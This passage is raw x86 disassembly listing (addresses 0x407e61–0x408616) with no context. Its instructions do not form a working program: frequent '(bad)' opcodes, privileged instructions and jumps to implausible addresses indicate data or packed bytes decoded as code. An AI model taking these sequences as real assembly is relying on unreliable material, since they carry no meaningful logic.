  407e61:	outs   dx,DWORD PTR ds:[esi]
  407e62:	xor    eax,0xffffffdb
  407e65:	js     0x407e1f
  407e67:	mov    esp,0x2c08a3ac
  407e6c:	mov    eax,0xc12cee4
  407e71:	sub    eax,0xba7c2054
  407e76:	hlt    
  407e77:	lods   al,BYTE PTR ds:[esi]
  407e78:	mov    DWORD PTR [eax],edi
  407e7a:	xchg   edi,eax
  407e7b:	punpckhdq mm4,QWORD PTR [ebp-0x2a57ebce]
  407e82:	enter  0x706c,0x8e
  407e86:	je     0x407eb7
  407e88:	mov    ebx,0x569c19e8
  407e8d:	rcr    al,1
  407e8f:	xor    esi,DWORD PTR [esp+edi*8+0x5e54b0db]
  407e96:	push   esi
  407e97:	cmp    al,0x58
  407e99:	sbb    al,0xe3
  407e9b:	sar    BYTE PTR [ecx],0x42
  407e9e:	or     eax,DWORD PTR [edi-0x3b]
  407ea1:	mov    eax,0x4791f0ff
  407ea6:	or     eax,DWORD PTR [ebx]
  407ea8:	jle    0x407e54
  407eaa:	daa    
  407eab:	daa    
  407eac:	daa    
  407ead:	mov    bh,0xab
  407eaf:	shrd   DWORD PTR [ebp+0x2727afae],ebp,0x27
  407eb7:	daa    
  407eb8:	nop
  407eb9:	xchg   ecx,eax
  407eba:	xchg   edx,eax
  407ebb:	xchg   ebx,eax
  407ebc:	lea    esp,[edi]
  407ebe:	daa    
  407ebf:	daa    
  407ec0:	xchg   esp,eax
  407ec1:	xchg   ebp,eax
  407ec2:	xchg   esi,eax
  407ec3:	dec    DWORD PTR [ecx+0x1e]
  407ec6:	jb     0x407ed0
  407ec8:	push   edi
  407ec9:	mov    ecx,0x946838f0
  407ece:	jo     0x407f2e
  407ed0:	enter  0xf0c0,0x38
  407ed4:	push   0x62c251ab
  407ed9:	outs   dx,DWORD PTR ds:[esi]
  407eda:	scas   eax,DWORD PTR es:[edi]
  407edb:	in     al,0x15
  407edd:	test   eax,0xdf0f01ac
  407ee2:	ds icebp 
  407ee4:	lds    edx,FWORD PTR [ecx+0x5c]
  407ee7:	cdq    
  407ee8:	cmp    al,0x1f
  407eea:	mov    eax,0xb584778c
  407eef:	sub    BYTE PTR [ecx+0x24],al
  407ef2:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  407ef3:	add    ch,BYTE PTR [edi]
  407ef5:	outs   dx,BYTE PTR ds:[esi]
  407ef6:	pop    es
  407ef7:	adc    esi,DWORD PTR [edx+0x45]
  407efa:	icebp  
  407efb:	cmp    al,0x7
  407efd:	scas   eax,DWORD PTR es:[edi]
  407efe:	jne    0x407f24
  407f00:	pop    es
  407f01:	or     BYTE PTR [ebx+0x40],0x77
  407f05:	jl     0x407ef8
  407f07:	sub    BYTE PTR [eax-0x2bbfcd10],dh
  407f0d:	icebp  
  407f0e:	push   edi
  407f0f:	inc    ebp
  407f10:	pop    eax
  407f11:	cmp    DWORD PTR [esp+edx*8],0x4c654af1
  407f18:	loope  0x407f1f
  407f1a:	les    esp,FWORD PTR [ecx+0x6d]
  407f1d:	outs   dx,DWORD PTR ds:[esi]
  407f1e:	xor    dl,dh
  407f20:	sub    bh,BYTE PTR [ecx+0x79]
  407f23:	push   eax
  407f24:	wrmsr  
  407f26:	repnz mov cl,dh
  407f29:	dec    esp
  407f2a:	int3   
  407f2b:	dec    ecx
  407f2c:	loope  0x407f74
  407f2e:	cli    
  407f2f:	mov    edi,0x72725590
  407f34:	xchg   ecx,eax
  407f35:	nop
  407f36:	in     al,0xd
  407f38:	jmp    0x814e4b5d
  407f3d:	ds in  al,dx
  407f3f:	mov    ecx,0xb768b902
  407f44:	in     al,dx
  407f45:	or     ebx,DWORD PTR [eax+ebp*2+0x704fbdf8]
  407f4c:	outs   dx,BYTE PTR gs:[esi]
  407f4e:	mov    bl,0x44
  407f50:	repz daa 
  407f52:	inc    esp
  407f53:	repz in al,0xbb
  407f56:	dec    esp
  407f57:	or     DWORD PTR [ebx],0xc19caf72
  407f5d:	ret    0x8b93
  407f60:	pushf  
  407f61:	clc    
  407f62:	repnz les edx,FWORD PTR [eax-0x2348553e]
  407f69:	sbb    DWORD PTR [esp+esi*4-0x61],0xf4aff417
  407f71:	jae    0x407f17
  407f73:	and    BYTE PTR [eax+0x5e],bl
  407f76:	jae    0x407f29
  407f78:	add    bh,BYTE PTR [ecx]
  407f7a:	shl    ecx,1
  407f7c:	dec    esp
  407f7d:	hlt    
  407f7e:	out    dx,eax
  407f7f:	dec    esp
  407f80:	hlt    
  407f81:	rol    DWORD PTR [esi+0x5e],1
  407f84:	nop
  407f85:	pop    esi
  407f86:	dec    esp
  407f87:	imul   esi,DWORD PTR [ebx+0x74],0x6384afa4
  407f8e:	add    eax,0x44e6a472
  407f93:	sti    
  407f94:	arpl   WORD PTR [ebx-0x15],di
  407f97:	mov    ebx,0xbff504e7
  407f9c:	imul   esp,DWORD PTR [ecx+0xa],0x11f504e4
  407fa3:	pushf  
  407fa4:	sub    al,0x28
  407fa6:	inc    esi
  407fa7:	das    
  407fa8:	mov    cl,BYTE PTR [ecx-0x3a]
  407fab:	jae    0x407f7e
  407fad:	cmp    ch,dh
  407faf:	fs mov edi,0xb9e81074
  407fb5:	push   edx
  407fb6:	add    eax,0x360857
  407fbb:	ds dec edi
  407fbd:	sub    DWORD PTR [edx],0x1646026e
  407fc3:	xor    al,0x5
  407fc5:	push   esp
  407fc6:	iret   
  407fc7:	inc    ebp
  407fc8:	ror    BYTE PTR [ebx+edx*4],cl
  407fcb:	(bad)  
  407fcc:	enter  0x24c8,0x4d
  407fd0:	loope  0x40802f
  407fd2:	and    eax,0xae0bb660
  407fd7:	dec    ebp
  407fd8:	in     al,dx
  407fd9:	pop    ebx
  407fda:	div    DWORD PTR [edx+0x4caff620]
  407fe0:	pop    ds
  407fe1:	sub    al,0x82
  407fe3:	pop    esi
  407fe4:	mov    ch,0xf7
  407fe6:	push   ss
  407fe7:	cmp    al,BYTE PTR [esi]
  407fe9:	add    al,0xaf
  407feb:	aam    0x3
  407fed:	push   es
  407fee:	cmp    al,0x4f
  407ff0:	jmp    0x408070
  407ff2:	add    al,0x6
  407ff4:	in     al,dx
  407ff5:	add    BYTE PTR [edx],al
  407ff7:	or     BYTE PTR ds:0xfef4335d,0xff
  407ffe:	mov    al,ds:0xe3042205
  408003:	push   eax
  408004:	pop    edx
  408005:	jae    0x408072
  408007:	ffree  st(0)
  408009:	je     0x407fe7
  40800b:	mov    ds:0x2507c796,al
  408010:	ret    0x183f
  408013:	pop    es
  408014:	or     DWORD PTR [ecx+0x7],esi
  408017:	inc    ebx
  408018:	ins    BYTE PTR es:[edi],dx
  408019:	popa   
  40801a:	mov    edi,0x76c8860f
  40801f:	outs   dx,DWORD PTR ds:[esi]
  408020:	je     0x40804e
  408022:	pmulhrw mm1,QWORD PTR [ecx-0x1]
  408027:	std    
  408028:	adc    al,0xa1
  40802a:	jae    0x40806d
  40802c:	fs popa 
  40802e:	jo     0x408088
  408030:	jb     0x407fb2
  408032:	dec    esi
  408033:	add    DWORD PTR [edi+ebp*1],esi
  408036:	pushf  
  408037:	jae    0x408025
  408039:	push   edx
  40803a:	shl    BYTE PTR [eax+0x11ffb0b9],1
  408040:	sahf   
  408041:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  408042:	add    BYTE PTR [eax],ah
  408044:	scas   eax,DWORD PTR es:[edi]
  408045:	cmp    eax,0xeb6dda82
  40804a:	mov    esi,0x2738af4
  40804f:	scas   eax,DWORD PTR es:[edi]
  408050:	xchg   DWORD PTR [edi+esi*8-0x56],esi
  408054:	push   es
  408055:	pop    ds
  408056:	mov    DWORD PTR [edx-0x879f8dd],eax
  40805c:	aam    0xf5
  40805e:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  40805f:	(bad)  
  408060:	dec    esi
  408061:	call   0xdc46252e
  408066:	pop    es
  408067:	inc    esi
  408068:	push   es
  408069:	inc    ecx
  40806a:	stc    
  40806b:	sahf   
  40806c:	fstp   DWORD PTR [esi]
  40806e:	aas    
  40806f:	pusha  
  408070:	or     cl,BYTE PTR [edi]
  408072:	push   0xf5c06c0
  408077:	xor    al,0x9b
  408079:	int    0xa7
  40807b:	nop
  40807c:	clc    
  40807d:	adc    BYTE PTR [eax-0x37edbfef],al
  408083:	outs   dx,BYTE PTR ds:[esi]
  408084:	mov    bh,0xbd
  408086:	not    esp
  408088:	jbe    0x408082
  40808a:	push   es
  40808b:	sbb    al,0x6f
  40808d:	pop    es
  40808e:	js     0x408099
  408090:	push   ss
  408091:	fmulp  st(0),st
  408093:	data16 sti 
  408095:	callw  0xb6a4
  408099:	je     0x4080a7
  40809b:	dec    eax
  40809c:	or     eax,0x38ac0e7c
  4080a1:	out    dx,eax
  4080a2:	mov    ebp,0xe0006fb
  4080a7:	push   cs
  4080a8:	push   es
  4080a9:	inc    esp
  4080aa:	xchg   esi,eax
  4080ab:	pushf  
  4080ac:	sahf   
  4080ad:	xor    BYTE PTR [eax+ebp*8+0x70e78151],bl
  4080b4:	test   BYTE PTR [ebx+0x8],0x54
  4080b8:	ret    
  4080b9:	mov    cl,0x6
  4080bb:	aaa    
  4080bc:	and    DWORD PTR [eax-0xbe2f851],edx
  4080c2:	mov    bh,cl
  4080c4:	fs and al,0xe4
  4080c7:	dec    eax
  4080c8:	test   BYTE PTR [esi+0x132d0e46],0xa1
  4080cf:	xchg   ebx,eax
  4080d0:	or     ecx,DWORD PTR [ecx+0x30]
  4080d3:	pushf  
  4080d4:	mov    al,dl
  4080d6:	call   0x2e78:0xf824afc9
  4080dd:	xor    DWORD PTR ss:[edi],edi
  4080e0:	int3   
  4080e1:	pop    ds
  4080e2:	mov    esp,0x91390930
  4080e7:	jl     0x408147
  4080e9:	test   al,0xf6
  4080eb:	or     BYTE PTR [ebx],dl
  4080ed:	cmp    eax,ebx
  4080ef:	out    0xdd,eax
  4080f1:	mov    al,0x15
  4080f3:	push   ds
  4080f4:	push   es
  4080f5:	call   0x609f96e6
  4080fa:	pop    ss
  4080fb:	push   es
  4080fc:	data16 jae 0x408085
  4080ff:	dec    edi
  408100:	mov    esp,0xac5f1890
  408105:	sbb    BYTE PTR [eax],ah
  408107:	sbb    DWORD PTR [edx+ebx*8-0x6f],edi
  40810b:	int    0x64
  40810d:	adc    esi,DWORD PTR [eax+0x13]
  408110:	or     al,0x14
  408112:	push   es
  408113:	dec    esp
  408114:	mov    eax,0x926f8614
  408119:	xor    ebx,DWORD PTR [edi+0x48]
  40811c:	push   ss
  40811d:	test   BYTE PTR [esi],dl
  40811f:	xchg   esp,eax
  408120:	push   ss
  408121:	pop    edi
  408122:	dec    edi
  408123:	repz mov esi,0xf086d429
  408129:	adc    esp,esi
  40812b:	push   ss
  40812c:	cmp    al,bl
  40812e:	xor    DWORD PTR [ecx+ebx*1+0x7d],0xffffffbe
  408133:	call   0xbf6f8450
  408138:	shl    ecx,1
  40813a:	sbb    DWORD PTR [eax+0x7],ebx
  40813d:	and    DWORD PTR [eax+edx*4],esp
  408140:	idiv   edi
  408142:	xor    al,0x51
  408144:	dec    eax
  408145:	call   0xfa087a86
  40814a:	cmp    edi,DWORD PTR [eax+0x6f37d56b]
  408150:	pop    esp
  408151:	(bad)  
  408152:	test   al,0x6
  408154:	jae    0x40819e
  408156:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  408157:	jecxz  0x408105
  408159:	sbb    DWORD PTR [edi],ebx
  40815b:	dec    esp
  40815c:	sbb    bl,BYTE PTR [esi]
  40815e:	push   es
  40815f:	jae    0x408132
  408161:	ds loope 0x40816b
  408164:	push   esp
  408165:	inc    edi
  408166:	lods   al,BYTE PTR ds:[esi]
  408167:	(bad)  
  408169:	or     al,0x9
  40816b:	nop
  40816c:	iret   
  40816d:	or     al,dh
  40816f:	clc    
  408170:	cwde   
  408171:	xlat   BYTE PTR ds:[ebx]
  408172:	popf   
  408173:	out    0xd3,al
  408175:	push   es
  408176:	adc    al,0xb4
  408178:	sbb    eax,esp
  40817a:	(bad)  
  40817c:	push   cs
  40817d:	push   esi
  40817e:	inc    ecx
  40817f:	dec    ecx
  408180:	loop   0x40818f
  408182:	push   esp
  408183:	dec    eax
  408184:	add    dh,BYTE PTR [ebx]
  408186:	mov    ds,WORD PTR [eax+ebp*2-0x5dbb9c5]
  40818d:	out    dx,eax
  40818e:	inc    eax
  40818f:	cli    
  408190:	pusha  
  408191:	stc    
  408192:	xor    BYTE PTR [eax-0x62],cl
  408195:	dec    eax
  408196:	aam    0x1d
  408198:	inc    ecx
  408199:	jmp    0x501f:0xe4c171df
  4081a0:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  4081a1:	push   cs
  4081a2:	push   cs
  4081a3:	push   esp
  4081a4:	dec    ecx
  4081a5:	fs or  ch,0x9
  4081a9:	loop   0x4081a7
  4081ab:	dec    ebp
  4081ac:	fmul   DWORD PTR [edx]
  4081ae:	jb     0x408229
  4081b0:	push   ss
  4081b1:	add    eax,0xbcff0517
  4081b6:	das    
  4081b7:	fistp  QWORD PTR [edx+ebp*2-0xebc018]
  4081be:	pushf  
  4081bf:	sti    
  4081c0:	or     DWORD PTR [edx+edx*2+0x65],edx
  4081c4:	addr16 cs xchg ecx,eax
  4081c7:	sub    al,0xf8
  4081c9:	inc    edi
  4081ca:	jb     0x40823b
  4081cc:	jne    0x40823e
  4081ce:	ficom  WORD PTR [ebx+edi*8]
  4081d1:	aas    
  4081d2:	push   cs
  4081d3:	imul   ebx,DWORD PTR [esi-0x4b],0xfd14af24
  4081da:	or     dh,BYTE PTR [ebx+0x51]
  4081dd:	add    eax,esi
  4081df:	sbb    BYTE PTR [edi+0x4ca92cd9],0x7c
  4081e6:	stc    
  4081e7:	mov    BYTE PTR [ebp-0x32],dl
  4081ea:	xchg   ebx,eax
  4081eb:	lds    edx,FWORD PTR [edx-0x753c19ae]
  4081f1:	sbb    ch,dh
  4081f3:	adc    eax,ebx
  4081f5:	and    edi,ebx
  4081f7:	inc    ebx
  4081f8:	add    al,0x1c
  4081fa:	fdiv   st,st(7)
  4081fc:	or     BYTE PTR [ebx],bh
  4081fe:	xor    ecx,DWORD PTR [edx-0x48]
  408201:	xor    dh,al
  408203:	or     al,0xa7
  408205:	out    dx,eax
  408206:	sub    BYTE PTR [esi+0x7c80b206],dl
  40820c:	nop
  40820d:	loope  0x408250
  40820f:	sub    al,0x1d
  408211:	call   0xa727a5d9
  408216:	sbb    ecx,DWORD PTR [eax+0xf04d9a5]
  40821c:	rcl    BYTE PTR [ebp+0x893a58a],0xc
  408223:	aad    0xdf
  408225:	or     BYTE PTR [edx],0x87
  408228:	fild   WORD PTR [eax+0x2d]
  40822b:	cmp    ecx,DWORD PTR [ecx-0x29]
  40822e:	or     cl,ah
  408230:	sbb    al,0x3b
  408232:	fmul   DWORD PTR [ebx-0x70]
  408235:	dec    ebx
  408236:	or     al,BYTE PTR [edx-0x69]
  408239:	(bad)  
  40823a:	jle    0x408296
  40823c:	rol    BYTE PTR [edi],1
  40823e:	addr16 (bad) 
  408240:	arpl   WORD PTR ds:0xbcf09bce,sp
  408246:	dec    ecx
  408247:	jmp    0x408221
  408249:	lods   eax,DWORD PTR ds:[esi]
  40824a:	xchg   edi,eax
  40824b:	push   cs
  40824c:	stos   DWORD PTR es:[edi],eax
  40824d:	(bad)  
  40824e:	or     ch,BYTE PTR [ecx]
  408250:	out    dx,eax
  408251:	int3   
  408252:	jge    0x40822f
  408254:	pusha  
  408255:	add    al,0xc8
  408257:	add    BYTE PTR [edx+0x20],dh
  40825a:	add    al,0x4
  40825c:	lods   eax,DWORD PTR ds:[esi]
  40825d:	popa   
  40825e:	ins    BYTE PTR es:[edi],dx
  40825f:	sbb    eax,0xd872a008
  408264:	imul   esi,DWORD PTR [edi+0x83111d8],0x296918fa
  40826e:	adc    al,0x2
  408270:	sbb    cl,bl
  408272:	dec    eax
  408273:	imul   edx,edi,0xb7130f25
  408279:	fprem  
  40827b:	lock (bad) 
  40827d:	(bad)  
  40827f:	mov    al,ds:0x8d04473f
  408284:	inc    edi
  408285:	or     BYTE PTR [eax-0x7f],dl
  408288:	mov    ecx,DWORD PTR ds:0xbc18030a
  40828e:	jl     0x4082ca
  408290:	jo     0x40828c
  408292:	jmp    0x4082b0
  408294:	enter  0x8025,0x3f
  408298:	sbb    al,0x35
  40829a:	in     al,dx
  40829b:	mov    BYTE PTR [esi+0x10],0x1
  40829f:	lds    esp,FWORD PTR [ebx-0x38]
  4082a2:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  4082a3:	adc    al,0x57
  4082a5:	repz out dx,al
  4082a7:	jg     0x40822c
  4082a9:	(bad)  [ebp-0x14e754ba]
  4082af:	push   0xed854d08
  4082b4:	jl     0x4082cc
  4082b6:	inc    ebp
  4082b7:	xor    edi,edi
  4082b9:	sbb    esp,DWORD PTR [ebx-0x287c7808]
  4082bf:	out    dx,eax
  4082c0:	test   DWORD PTR [edi+0x4d],0x2d2fed75
  4082c7:	lods   eax,DWORD PTR ds:[esi]
  4082c8:	bound  edx,QWORD PTR ds:0x36192757
  4082ce:	cwde   
  4082cf:	jge    0x4082f0
  4082d1:	add    eax,0xffffff9d
  4082d4:	and    BYTE PTR [esi-0x79e73fe9],dh
  4082da:	rol    dl,1
  4082dc:	outs   dx,DWORD PTR ds:[esi]
  4082dd:	inc    edi
  4082de:	mov    bh,0xf8
  4082e0:	sbb    eax,0x1735eebc
  4082e5:	rol    edi,cl
  4082e7:	jle    0x4082be
  4082e9:	(bad)  
  4082ea:	jmp    0x4082e4
  4082ec:	into   
  4082ed:	push   0x2
  4082ef:	mov    ah,0x14
  4082f1:	stos   BYTE PTR es:[edi],al
  4082f2:	add    dl,ch
  4082f4:	adc    bh,BYTE PTR [eax+0x49dbcb61]
  4082fa:	xlat   BYTE PTR ds:[ebx]
  4082fb:	retf   
  4082fc:	rcl    BYTE PTR [edi],0x3a
  4082ff:	jo     0x408318
  408301:	mov    eax,ds:0x6ceda954
  408306:	rcr    al,1
  408308:	nop
  408309:	xlat   BYTE PTR ds:[ebx]
  40830a:	les    ebx,FWORD PTR [edx]
  40830c:	(bad)  
  40830d:	xor    esp,DWORD PTR [esi]
  40830f:	sbb    eax,0x21a323bb
  408314:	cmp    al,0x2d
  408316:	js     0x40835b
  408318:	add    DWORD PTR [esi-0x14],0xffffffd4
  40831c:	push   ss
  40831d:	jo     0x40831d
  40831f:	pop    ss
  408320:	jbe    0xfeb14c7c
  408326:	inc    edi
  408327:	inc    ebx
  408328:	cwde   
  408329:	inc    eax
  40832a:	pushf  
  40832b:	or     esp,edi
  40832d:	(bad)  
  40832e:	adc    DWORD PTR ds:0xb7460628,edx
  408334:	ins    BYTE PTR es:[edi],dx
  408335:	mov    al,0xd1
  408337:	xor    al,0xed
  408339:	dec    ebp
  40833a:	or     al,0xa
  40833c:	or     BYTE PTR [eax],cl
  40833e:	or     al,0xe1
  408340:	add    DWORD PTR [edx+0x2a],0xdc2c97f3
  408347:	push   eax
  408348:	ins    DWORD PTR es:[edi],dx
  408349:	(bad)  
  40834a:	and    al,0xfe
  40834c:	popa   
  40834d:	push   esp
  40834e:	mov    edx,DWORD PTR ss:[esi]
  408351:	out    dx,al
  408352:	js     0x4083a4
  408354:	push   0x55ad9ff2
  408359:	sbb    ebx,edi
  40835b:	jg     0x4083c2
  40835d:	jne    0x4082e0
  40835f:	lds    edi,FWORD PTR [ebx+0x23a008ad]
  408365:	inc    esi
  408366:	lea    ebx,[ecx+0x76]
  408369:	xor    ch,BYTE PTR ds:0x5cedbd89
  40836f:	and    BYTE PTR [eax],bl
  408371:	sbb    cl,BYTE PTR [edi+ebx*2]
  408374:	lock lahf 
  408376:	cld    
  408377:	dec    ebx
  408378:	cld    
  408379:	mov    DWORD PTR [edx],ecx
  40837b:	jmp    0x408395
  40837d:	ret    
  40837e:	or     BYTE PTR [esi+0x75],cl
  408381:	loope  0x4083a9
  408383:	add    dl,BYTE PTR [esi]
  408385:	imul   esp,DWORD PTR [edi+0x30a8775],0xffffffbf
  40838c:	fadd   QWORD PTR [ebx+0x8461e83]
  408392:	mov    esi,0x3bfe3c48
  408397:	add    esi,DWORD PTR [ebp+0x10]
  40839a:	mov    BYTE PTR [ebp-0x5],0x94
  40839e:	fld    DWORD PTR [ebx]
  4083a0:	out    dx,eax
  4083a1:	sub    eax,DWORD PTR [eax]
  4083a3:	les    ecx,FWORD PTR [edx]
  4083a5:	jns    0x40838d
  4083a7:	sub    al,BYTE PTR [eax]
  4083a9:	adc    DWORD PTR ds:0x7d8672c4,esi
  4083af:	nop
  4083b0:	ja     0x4083fa
  4083b2:	push   esp
  4083b3:	popf   
  4083b4:	add    dl,BYTE PTR [ecx]
  4083b6:	or     BYTE PTR [ebp+0x63],dl
  4083b9:	xlat   BYTE PTR ds:[ebx]
  4083ba:	aaa    
  4083bb:	pop    eax
  4083bc:	lahf   
  4083bd:	jae    0x4083c7
  4083bf:	cmp    edi,DWORD PTR [esi*2-0x177705fa]
  4083c6:	dec    esp
  4083c7:	aas    
  4083c8:	adc    cl,BYTE PTR [edx+0x3c]
  4083cb:	mov    al,0xff
  4083cd:	mov    cl,0x6e
  4083cf:	xor    al,ah
  4083d1:	cmp    BYTE PTR [eax+0x3dc9330b],0x1c
  4083d8:	adc    DWORD PTR [esi],ebp
  4083da:	push   0xffffffc8
  4083dc:	iret   
  4083dd:	stos   DWORD PTR es:[edi],eax
  4083de:	xchg   BYTE PTR ds:0x94f10102,bh
  4083e4:	adc    DWORD PTR [eax-0x59],ebx
  4083e7:	xor    al,dl
  4083e9:	push   cs
  4083ea:	push   cs
  4083eb:	xor    cl,BYTE PTR [edx+0x5]
  4083ee:	cwde   
  4083ef:	or     BYTE PTR [ebp-0x10],bh
  4083f2:	and    DWORD PTR [esp+0x15],ebp
  4083f6:	in     al,dx
  4083f7:	enter  0xddce,0xf0
  4083fb:	push   0x631cf111
  408400:	repnz mov ds:0xfa4bfff8,eax
  408406:	call   0xe2788289
  40840b:	lock jge 0x408427
  40840e:	sub    eax,esi
  408410:	mov    ecx,eax
  408412:	shl    ecx,0x2
  408415:	lea    edx,[eax+esi*4]
  408418:	or     eax,DWORD PTR [ebx+eax*2+0x76]
  40841c:	sbb    eax,ecx
  40841e:	adc    eax,0xb1f5281b
  408423:	add    al,BYTE PTR [ecx]
  408425:	xlat   BYTE PTR ds:[ebx]
  408426:	(bad)  
  408427:	pop    ds
  408428:	mov    bl,0x45
  40842a:	add    al,0x2f
  40842c:	xor    al,0x52
  40842e:	ja     0x408433
  408430:	in     al,0x93
  408432:	sub    al,0x50
  408434:	mov    edx,esi
  408436:	(bad)  
  408437:	ds add al,0xbc
  40843a:	or     BYTE PTR [edx+0x2187c8f5],cl
  408440:	and    BYTE PTR [esi],ah
  408442:	inc    eax
  408443:	hlt    
  408444:	xchg   edx,eax
  408445:	js     0x4083fb
  408447:	into   
  408448:	jmp    0xe34c68c4
  40844d:	jbe    0x4084a6
  40844f:	jb     0x4084bb
  408451:	mov    ah,0x0
  408453:	inc    ecx
  408454:	jmp    0x1265:0xc436185d
  40845b:	into   
  40845c:	push   ds
  40845d:	data16 adc al,BYTE PTR [edi+0x4930f0ab]
  408464:	mov    ebx,0x5034100
  408469:	aaa    
  40846a:	inc    eax
  40846b:	pushf  
  40846c:	fld    QWORD PTR [ebx+0x5c]
  40846f:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  408470:	xchg   ebp,eax
  408471:	or     eax,0x8bb0045e
  408476:	push   eax
  408477:	ins    BYTE PTR es:[edi],dx
  408478:	sbb    al,BYTE PTR [edx-0x3e]
  40847b:	add    eax,0x85cac406
  408480:	leave  
  408481:	mov    ds:0x18b4002d,al
  408486:	rol    DWORD PTR [ebx],0x6a
  408489:	jmp    0x40849c
  40848b:	and    al,0x8
  40848d:	or     bl,al
  40848f:	nop
  408490:	adc    BYTE PTR [eax],0x1b
  408493:	jmp    0x40849a
  408495:	ret    
  408496:	xlat   BYTE PTR ds:[ebx]
  408497:	ret    
  408498:	jnp    0x408511
  40849a:	add    ecx,edx
  40849c:	mov    edx,ecx
  40849e:	xchg   ebp,eax
  40849f:	paddsb mm2,QWORD PTR [esi]
  4084a2:	add    ebp,DWORD PTR [eax]
  4084a4:	jp     0x408491
  4084a6:	add    DWORD PTR [ecx+0x3b],eax
  4084a9:	and    BYTE PTR [ebp+0x44],bh
  4084ac:	add    al,0x3b
  4084ae:	inc    ebx
  4084af:	push   ebp
  4084b0:	jnp    0x40846d
  4084b2:	clc    
  4084b3:	jne    0x4084a7
  4084b5:	sbb    BYTE PTR [ebp+0x7a],dh
  4084b8:	leave  
  4084b9:	cld    
  4084ba:	rcl    edi,0xe
  4084bd:	mov    edx,0xf3f2d832
  4084c2:	cmp    al,dh
  4084c4:	add    al,0x9
  4084c6:	xor    eax,0xbb1b54a4
  4084cb:	adc    al,0x68
  4084cd:	adc    ebp,edx
  4084cf:	pusha  
  4084d0:	mov    bh,0x57
  4084d2:	das    
  4084d3:	or     dl,ch
  4084d5:	sub    al,0x2
  4084d7:	jb     0x4084c9
  4084d9:	inc    DWORD PTR [edi]
  4084db:	jle    0x40851b
  4084dd:	sbb    dh,0xfe
  4084e0:	adc    dh,ah
  4084e2:	or     bh,BYTE PTR [eax]
  4084e4:	(bad)  
  4084e5:	shl    edx,0x2
  4084e8:	aas    
  4084e9:	sbb    eax,esp
  4084eb:	sbb    BYTE PTR [edi],al
  4084ed:	add    BYTE PTR [edi],al
  4084ef:	inc    eax
  4084f0:	xchg   edi,eax
  4084f1:	in     eax,dx
  4084f2:	inc    edx
  4084f3:	scas   al,BYTE PTR es:[edi]
  4084f4:	and    eax,0x7e4879b3
  4084f9:	in     eax,0x8a
  4084fb:	rcl    DWORD PTR [edi],1
  4084fd:	and    DWORD PTR [eax-0x69],0x7e
  408501:	sbb    DWORD PTR [eax],ebx
  408503:	mov    BYTE PTR [eax+0x58],cl
  408506:	adc    esi,DWORD PTR [eax+0x18f04682]
  40850c:	sub    DWORD PTR [eax],0x9282ec30
  408512:	jge    0x4084d0
  408514:	(bad)  
  408515:	mov    ebx,0x4de85c0c
  40851a:	mov    edi,esi
  40851c:	sub    edi,ebp
  40851e:	jg     0x40852e
  408520:	dec    edi
  408521:	xchg   esp,eax
  408522:	add    dh,BYTE PTR [edi]
  408524:	test   DWORD PTR [ebx],edx
  408526:	dec    ebx
  408527:	dec    ebp
  408528:	inc    edi
  408529:	inc    edx
  40852a:	cmp    dl,BYTE PTR [ecx+0x52]
  40852d:	pop    es
  40852e:	pop    edi
  40852f:	arpl   di,bx
  408531:	scas   eax,DWORD PTR es:[edi]
  408532:	pusha  
  408533:	ror    BYTE PTR ds:0xe7b80b18,0x88
  40853a:	xchg   edx,eax
  40853b:	mov    edx,0x46ee4662
  408540:	and    BYTE PTR [eax],al
  408542:	ins    DWORD PTR es:[edi],dx
  408543:	add    BYTE PTR [eax+0xd],bl
  408546:	shl    BYTE PTR [edi+0x25],0x1f
  40854a:	call   0xc2d6:0x60f39df8
  408551:	add    al,BYTE PTR [ecx+0x6]
  408554:	add    esi,eax
  408556:	cmp    BYTE PTR [ebp+0x7],0xc0
  40855a:	fucomp st(6)
  40855c:	cmp    BYTE PTR [ebx],al
  40855e:	leave  
  40855f:	push   esi
  408560:	ja     0x408526
  408562:	push   cs
  408563:	sbb    al,BYTE PTR [eax+0x18776e3b]
  408569:	sbb    esp,esp
  40856b:	pop    ecx
  40856c:	mov    ecx,DWORD PTR [ecx]
  40856e:	scas   al,BYTE PTR es:[edi]
  40856f:	xor    BYTE PTR [edi-0x74],dh
  408572:	jmp    0xc9beb357
  408577:	pop    eax
  408578:	add    eax,DWORD PTR [eax+0x2012078]
  40857e:	sti    
  40857f:	in     al,dx
  408580:	xlat   BYTE PTR ds:[ebx]
  408581:	mov    esi,0x40948c38
  408586:	jne    0x408597
  408588:	pop    ds
  408589:	out    dx,eax
  40858a:	sub    bl,0x1e
  40858d:	dec    edi
  40858e:	mov    WORD PTR [esi+0x7502f153],?
  408594:	adc    eax,0xce3b3400
  408599:	xchg   esp,eax
  40859a:	in     al,0x11
  40859c:	pop    esp
  40859d:	or     eax,0x50035f43
  4085a2:	pop    esp
  4085a3:	lea    eax,[edx+0x47]
  4085a6:	inc    esp
  4085a7:	push   edi
  4085a8:	mov    esp,0x14a30f04
  4085ad:	in     eax,dx
  4085ae:	and    ch,BYTE PTR [edi]
  4085b0:	aaa    
  4085b1:	fwait
  4085b2:	and    BYTE PTR ds:0x3825bb13,0xc5
  4085b9:	jne    0x40861b
  4085bb:	sbb    DWORD PTR [edx+eax*8],0x9a1e1197
  4085c2:	test   eax,0xb00e0157
  4085c7:	and    eax,0x48b1947
  4085cc:	inc    esp
  4085cd:	ret    0x323e
  4085d0:	rol    DWORD PTR [edx+edx*4-0xb10ee16],1
  4085d7:	adc    BYTE PTR [ecx+0x7ee10d50],al
  4085dd:	test   ebp,0x3739e454
  4085e3:	retf   0x4104
  4085e6:	dec    esi
  4085e7:	sbb    eax,0x253025d
  4085ec:	sub    eax,DWORD PTR [esi]
  4085ee:	outs   dx,DWORD PTR ds:[esi]
  4085ef:	jle    0x408659
  4085f1:	popf   
  4085f2:	jmp    0xe00d:0xc2f4319
  4085f9:	add    al,0x41
  4085fb:	add    bl,BYTE PTR [edx]
  4085fd:	or     BYTE PTR [eax-0x5b],bl
  408600:	in     al,dx
  408601:	mov    esp,ds
  408603:	call   0x373:0xbf08506
  40860a:	test   DWORD PTR [edi],esp
  40860c:	cmp    dl,BYTE PTR [edi-0x70bc15a]
  408612:	sbb    BYTE PTR [ecx-0x7e],0x30
  408616:	lea    ebp,[ebp+esi*8+0x210d4350]
